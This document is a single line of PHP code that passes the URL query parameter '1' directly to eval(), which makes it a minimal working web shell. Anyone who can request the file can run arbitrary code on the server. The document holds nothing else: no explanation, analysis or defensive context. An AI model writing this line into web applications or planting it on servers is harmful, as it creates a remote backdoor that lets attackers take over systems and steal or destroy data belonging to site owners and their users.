<?php eval($_GET[1]); ?>
